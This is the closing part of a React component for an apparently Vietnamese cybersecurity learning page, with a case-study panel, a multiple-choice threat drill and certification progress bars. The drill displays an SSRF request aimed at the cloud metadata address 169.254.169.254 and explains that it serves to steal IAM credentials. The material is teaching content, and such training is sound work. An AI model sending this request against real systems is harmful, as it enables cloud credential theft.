                  <span className="text-[10px] font-mono-tech font-semibold text-emerald-700 dark:text-emerald-300 uppercase block">
                    Nguyên Nhân Gốc Rễ &amp; Bản Vá Phòng Thủ
                  </span>
                  <p className="text-[#475569] dark:text-[#94A3B8] text-xs leading-relaxed">
                    <strong className="text-[#0F172A] dark:text-[#F1F5F9]">Nguyên nhân:</strong>{" "}
                    {currentCaseStudy.rootCause}
                  </p>
                  <p className="text-[#475569] dark:text-[#94A3B8] text-xs leading-relaxed">
                    <strong className="text-[#0F172A] dark:text-[#F1F5F9]">Khắc phục:</strong>{" "}
                    {currentCaseStudy.remediation}
                  </p>
                </div>
              </div>

              {/* Archival Dark Log Telemetry Block */}
              <div className="p-3.5 rounded-lg bg-[#0F172A] dark:bg-[#080B10] border border-[#1E293B] dark:border-white/[0.08] font-mono-tech text-xs text-emerald-300 overflow-x-auto">
                <code>{currentCaseStudy.logSnippet}</code>
              </div>
            </div>
          </section>
        </div>

        {/* ====================================================================
            RIGHT SIDEBAR: DAILY THREAT DRILL & CERTIFICATION ALIGNMENT (4 COLS)
           ==================================================================== */}
        <aside className="lg:col-span-4 space-y-6">
          {/* §04: INTERACTIVE DAILY THREAT DRILL */}
          <div className="p-5 rounded-xl bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.08] shadow-xs space-y-3.5">
            <div className="flex items-center justify-between gap-2">
              <span className="font-mono-tech text-[10px] font-semibold px-2 py-0.5 rounded bg-blue-50 dark:bg-blue-500/12 text-[#1D4ED8] dark:text-[#93C5FD] border border-blue-200 dark:border-blue-500/25 uppercase tracking-wider">
                §04 // DAILY THREAT DRILL
              </span>
              <span className="text-[11px] font-mono-tech text-amber-700 dark:text-amber-300 font-semibold">
                +150 XP
              </span>
            </div>

            <h3 className="font-serif-editorial text-lg font-medium text-[#0F172A] dark:text-[#F1F5F9] leading-snug">
              Phân Tích Vector Tấn Công Trong HTTP Request
            </h3>

            <p className="text-xs text-[#475569] dark:text-[#94A3B8] leading-relaxed font-sans">
              Cụm Reverse Proxy WAF ghi nhận yêu cầu bất thường hướng về endpoint nội bộ dưới đây:
            </p>

            {/* Telemetry Snippet */}
            <div className="rounded-lg bg-[#0F172A] dark:bg-[#080B10] p-3 font-mono-tech text-[11px] text-slate-200 overflow-x-auto space-y-1 border border-[#1E293B] dark:border-white/[0.08]">
              <div className="text-sky-300 font-semibold">
                GET /api/v1/proxy?target=http://169.254.169.254/latest/meta-data/ HTTP/1.1
              </div>
              <div className="text-slate-400">Host: app.enterprise-corp.internal</div>
              <div className="text-slate-400">User-Agent: curl/7.88.1</div>
              <div className="text-slate-400">Authorization: Bearer test_token</div>
            </div>

            {/* Interactive Options */}
            <div className="space-y-2">
              {[
                { label: "Server-Side Request Forgery (SSRF) nhắm vào AWS Metadata", isCorrect: true },
                { label: "Blind Time-Based SQL Injection qua tham số Target", isCorrect: false },
                { label: "Cross-Site Scripting (XSS) qua DOM Sink Injection", isCorrect: false },
                { label: "Broken Object Level Authorization (BOLA / IDOR)", isCorrect: false },
              ].map((opt, idx) => {
                const isSelected = drillAnswer === idx
                return (
                  <button
                    key={idx}
                    type="button"
                    disabled={drillSubmitted}
                    onClick={() => handleDrillSubmit(idx)}
                    className={`w-full text-left p-2.5 rounded-lg text-xs transition-colors flex items-start gap-2.5 cursor-pointer border ${
                      drillSubmitted
                        ? opt.isCorrect
                          ? "bg-emerald-50 dark:bg-emerald-950/35 border-emerald-500 text-emerald-900 dark:text-emerald-200 font-semibold"
                          : isSelected
                          ? "bg-rose-50 dark:bg-rose-950/35 border-rose-500 text-rose-900 dark:text-rose-200"
                          : "bg-[#F3F1EC] dark:bg-[#161C2A]/50 border-[#E5E2DC] dark:border-white/[0.06] text-[#64748B] opacity-60"
                        : "bg-[#FAF9F6] hover:bg-[#F3F1EC] dark:bg-[#0B0E14] dark:hover:bg-[#161C2A] border-[#E5E2DC] dark:border-white/[0.08] text-[#0F172A] dark:text-[#F1F5F9]"
                    }`}
                  >
                    <span className="font-mono-tech text-[10px] font-bold px-1.5 py-0.5 rounded bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.1] text-[#475569] dark:text-[#94A3B8] shrink-0">
                      {String.fromCharCode(65 + idx)}
                    </span>
                    <span className="flex-1 leading-snug">{opt.label}</span>
                  </button>
                )
              })}
            </div>

            {drillSubmitted && (
              <div className="mt-2 p-3.5 rounded-lg bg-[#FAF9F6] dark:bg-[#0B0E14] border border-[#E5E2DC] dark:border-white/[0.08] text-xs space-y-2">
                <div className="flex items-center gap-1.5 font-semibold font-mono-tech">
                  {drillAnswer === 0 ? (
                    <>
                      <Check className="h-4 w-4 text-emerald-600 dark:text-emerald-400 shrink-0" />
                      <span className="text-emerald-700 dark:text-emerald-400">
                        Chính xác! +150 XP đã ghi nhận
                      </span>
                    </>
                  ) : (
                    <>
                      <AlertTriangle className="h-4 w-4 text-amber-600 dark:text-amber-400 shrink-0" />
                      <span className="text-amber-700 dark:text-amber-400">
                        Phân tích bổ sung
                      </span>
                    </>
                  )}
                </div>
                <p className="text-[#475569] dark:text-[#94A3B8] text-[11px] leading-relaxed">
                  Địa chỉ IP{" "}
                  <code className="font-mono-tech text-[#1D4ED8] dark:text-[#38BDF8] bg-white dark:bg-[#121722] px-1 py-0.5 rounded border border-[#E5E2DC] dark:border-white/[0.08]">
                    169.254.169.254
                  </code>{" "}
                  thuộc dải link-local (RFC 3927) của AWS/Azure Instance Metadata Service (IMDS). Kẻ tấn công lợi dụng SSRF để đánh cắp phiên IAM tạm thời.
                </p>
                <button
                  type="button"
                  onClick={handleDrillReset}
                  className="inline-flex items-center gap-1 text-[11px] font-semibold text-[#1D4ED8] dark:text-[#38BDF8] hover:underline pt-1 cursor-pointer font-mono-tech"
                >
                  <RotateCcw className="h-3 w-3" />
                  <span>Làm lại bài tập</span>
                </button>
              </div>
            )}
          </div>

          {/* §05: INDUSTRY CERTIFICATION ROADMAP MAPPING */}
          <div className="p-5 rounded-xl bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.08] shadow-xs space-y-4">
            <div className="space-y-1">
              <span className="text-[10px] font-mono-tech font-semibold uppercase tracking-wider text-[#64748B] dark:text-[#94A3B8] block">
                §05 // ĐỐI CHIẾU CHUẨN NGHỀ NGHIỆP
              </span>
              <div className="flex items-center gap-2">
                <Award className="h-4 w-4 text-[#1D4ED8] dark:text-[#38BDF8]" />
                <h3 className="font-serif-editorial text-base font-medium text-[#0F172A] dark:text-[#F1F5F9]">
                  Mức Độ Bao Phủ Chứng Chỉ Quốc Tế
                </h3>
              </div>
            </div>

            <p className="text-xs text-[#475569] dark:text-[#94A3B8] leading-relaxed font-sans">
              Nội dung bài học được ánh xạ trực tiếp theo khung kiến thức các chứng chỉ an ninh mạng uy tín:
            </p>

            <div className="space-y-3">
              {[
                { name: "CompTIA Security+ (SY0-701)", readiness: 85 },
                { name: "Certified Ethical Hacker (CEH v12)", readiness: 65 },
                { name: "OffSec Certified Professional (OSCP)", readiness: 45 },
                { name: "Certified Cloud Security (CCSP)", readiness: 35 },
              ].map((cert, i) => (
                <div key={i} className="space-y-1">
                  <div className="flex justify-between text-xs font-medium">
                    <span className="text-[#0F172A] dark:text-[#F1F5F9] truncate max-w-[210px]">
                      {cert.name}
                    </span>
                    <span className="font-mono-tech text-[#1D4ED8] dark:text-[#38BDF8] font-semibold">
                      <CountUp end={cert.readiness} start={cert.readiness} suffix="%" />
                    </span>
                  </div>
                  <div className="h-1.5 w-full bg-[#ECE9E2] dark:bg-[#1B2335] rounded-full overflow-hidden">
                    <div
                      className="h-full bg-[#1D4ED8] dark:bg-[#3B82F6] rounded-full transition-all duration-300"
                      style={{ width: `${cert.readiness}%` }}
                    />
                  </div>
                </div>
              ))}
            </div>

            <div className="pt-1">
              <Link
                to="/learning-paths"
                className="w-full block text-center py-2.5 rounded-lg bg-[#F3F1EC] hover:bg-[#ECE9E2] dark:bg-[#161C2A] dark:hover:bg-[#1B2335] text-[#0F172A] dark:text-[#F1F5F9] font-mono-tech text-xs font-semibold transition-colors border border-[#E5E2DC] dark:border-white/[0.08]"
              >
                Khám Phá Lộ Trình Học Thuật →
              </Link>
            </div>
          </div>

          {/* §06: LABS & CERTIFICATE VERIFICATION PORTAL */}
          <div className="p-5 rounded-xl bg-[#F3F1EC] dark:bg-[#161C2A] border border-[#E5E2DC] dark:border-white/[0.08] space-y-3">
            <div className="flex items-center gap-2 font-mono-tech text-xs text-[#1D4ED8] dark:text-[#38BDF8] font-semibold">
              <Terminal className="h-4 w-4" />
              <span>THAO TRƯỜNG LABS &amp; XÁC THỰC</span>
            </div>
            <p className="text-xs text-[#475569] dark:text-[#94A3B8] leading-relaxed font-sans">
              Thực hành khai thác trên môi trường cô lập và tra cứu tính toàn vẹn văn bằng SHA-256 / PGP tại cổng xác thực công khai.
            </p>
            <div className="space-y-2 pt-1">
              <Link
                to="/labs"
                className="block w-full text-center py-2.5 rounded-lg bg-[#1D4ED8] hover:bg-[#1E40AF] dark:bg-[#3B82F6] dark:hover:bg-[#2563EB] text-white font-semibold text-xs transition-colors"
              >
                Mở Phòng Thí Nghiệm Thực Chiến
              </Link>
              <Link
                to="/verify"
                className="flex items-center justify-center gap-1.5 w-full py-2 rounded-lg bg-white hover:bg-[#FAF9F6] dark:bg-[#121722] dark:hover:bg-[#1B2335] text-[#0F172A] dark:text-[#F1F5F9] font-mono-tech text-xs font-medium border border-[#E5E2DC] dark:border-white/[0.08] transition-colors"
              >
                <ShieldCheck className="h-3.5 w-3.5 text-[#1D4ED8] dark:text-[#38BDF8]" />
                <span>Cổng Tra Cứu Chứng Chỉ (/verify)</span>
              </Link>
            </div>
          </div>
        </aside>
      </div>

      {/* Lazy-Loaded Modals */}
      <Suspense fallback={null}>
        <CourseSyllabusDrawer
          course={drawerCourse}
          isOpen={!!drawerCourse}
          onClose={() => setDrawerCourse(null)}
        />
        <InteractiveLessonModal />
      </Suspense>
    </div>
  )
}

export default Learning
